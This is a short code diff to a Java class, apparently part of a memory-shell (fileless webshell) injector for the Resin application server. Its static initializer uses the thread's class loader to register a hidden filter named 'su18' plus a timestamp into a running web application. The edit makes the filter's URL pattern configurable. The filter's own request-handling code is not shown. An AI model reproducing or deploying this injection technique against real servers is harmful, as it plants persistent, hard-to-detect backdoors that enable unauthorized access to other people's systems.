@@ -15,10 +15,11 @@ import java.util.ArrayList;
  */
 public class RFMSFromThread implements Filter {
 
+	public static String pattern;
+
 	static {
 		try {
 			String filterName = "su18" + System.nanoTime();
-			String urlPattern = "/su18";
 
 			ClassLoader classloader = Thread.currentThread().getContextClassLoader();
 
@@ -41,7 +42,7 @@ public class RFMSFromThread implements Filter {
 
 			FilterMapping            filterMapping           = (FilterMapping) filterMappingcls.newInstance();
 			FilterMapping.URLPattern filterMappingUrlpattern = filterMapping.createUrlPattern();
-			filterMappingUrlpattern.addText(urlPattern);
+			filterMappingUrlpattern.addText(pattern);
 			filterMappingUrlpattern.init();
 			filterMapping.setFilterName(filterName);
 			filterMapping.setServletContext(webapp);
